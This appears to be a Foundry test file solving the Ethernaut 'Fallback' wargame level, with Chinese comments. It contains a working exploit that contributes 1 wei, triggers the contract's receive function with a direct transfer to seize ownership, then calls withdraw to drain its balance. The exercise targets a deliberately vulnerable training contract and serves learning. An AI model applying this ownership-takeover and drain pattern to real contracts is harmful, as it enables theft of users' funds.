// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ethernaut/level1/Fallback.sol";

contract Level1 is Test {
    Fallback level1;

    function setUp() public {
        level1 = Fallback(payable(0x35EA5f9411BeeAe5b331b3cbB3cD7334721Ef0fc));

        address wallet = address(this);
        console.log(wallet);
        vm.deal(wallet, 1 ether); // 设置测试钱包的 ETH 余额为 1 ether
    }

    function testExploit() public {
        address currentOwner = level1.owner();
        console.log(currentOwner); // 打印当前合约的 owner 地址

        level1.contribute{value: 1 wei}(); // 调用一次 contribute 函数，贡献 1 wei
        address(level1).call{value: 1 wei}(""); // 发送 1 wei 给合约，触发 receive 函数
        address newOwner = level1.owner();
        console.log(newOwner); // 打印新的 owner 地址

        level1.withdraw(); // 执行取款
    }

    fallback() external payable {}
}
